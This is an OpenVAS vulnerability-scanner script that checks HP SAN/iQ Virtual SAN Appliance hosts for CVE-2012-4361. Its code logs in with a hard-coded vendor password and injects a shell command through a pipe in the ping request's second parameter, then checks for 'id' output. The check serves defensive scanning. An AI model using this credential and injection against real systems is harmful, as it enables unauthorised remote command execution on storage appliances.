###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hp_saniq_virtual_san_app_sec_param_rce_vuln.nasl 11888 2018-10-12 15:27:49Z cfischer $
#
# HP SAN/iQ Virtual SAN Appliance Second Parameter Command Execution Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802454");
  script_version("$Revision: 11888 $");
  script_cve_id("CVE-2012-4361");
  script_bugtraq_id(55132);
  script_tag(name:"cvss_base", value:"7.7");
  script_tag(name:"cvss_base_vector", value:"AV:A/AC:L/Au:S/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 17:27:49 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-09-05 14:44:25 +0530 (Wed, 05 Sep 2012)");
  script_name("HP SAN/iQ Virtual SAN Appliance Second Parameter Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/unknown", 13838);

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/441363");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18893/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18901/");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary commands
  the context of an application.");
  script_tag(name:"affected", value:"HP SAN/iQ version prior to 9.5 on HP Virtual SAN Appliance");
  script_tag(name:"insight", value:"The flaw is due to an error in 'lhn/public/network/ping' which does not
  properly handle shell meta characters in the second parameter.");
  script_tag(name:"solution", value:"Upgrade to HP SAN/iQ 9.5 or later.");
  script_tag(name:"summary", value:"This host is running HP SAN/iQ Virtual SAN Appliance and is prone
  to remote command execution vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.hp.com/");
  exit(0);
}


include("misc_func.inc");
include("byte_func.inc");

## Create a packet with  command to be executed
function create_packet()
{
  cmd = ""; packet = "";
  cmd = _FCT_ANON_ARGS[0]; ##  holds command to be executed
  packet = crap(data:raw_string(0x00), length:7) + raw_string(0x01) +
           mkdword(strlen(cmd)) + crap(data:raw_string(0x00), length:15) +
           raw_string(0x14,0xff,0xff,0xff,0xff) + cmd ;
  return packet;
}

function hydra_send_recv()
{
  socket=""; request= ""; header=""; data="";
  socket = _FCT_ANON_ARGS[0];
  request = _FCT_ANON_ARGS[1];

  send(socket:socket, data:request);
  header = recv(socket:socket, length:32);

  data = recv(socket:socket,length:1024);
  return data;
}

port = get_unknown_port( default:13838 );
soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

# login with a hard coded password
login = create_packet('login:/global$agent/L0CAlu53R/Version "9.5.0"');
res = hydra_send_recv(soc, login);

if(res && 'OK: Login' >< res)
{
  cmd = 'id';
  ping = create_packet('get:/lhn/public/network/ping/127.0.0.1/|'
                       + cmd + ' #/64/5/');
  res = hydra_send_recv(soc, ping);

  # older versions invokes the ping command differently
  if(res && 'incorrect number of parameters specified' >< res)
  {
    ping = create_packet('get:/lhn/public/network/ping/127.0.0.1/|'
                         + cmd + ' #/');
    res = hydra_send_recv(soc, ping);
  }
}

close(soc);

if(res && egrep(string:res, pattern:'uid=[0-9]+.*gid=[0-9]+.*')){
  security_message( port:port );
  exit( 0 );
}

exit( 99 );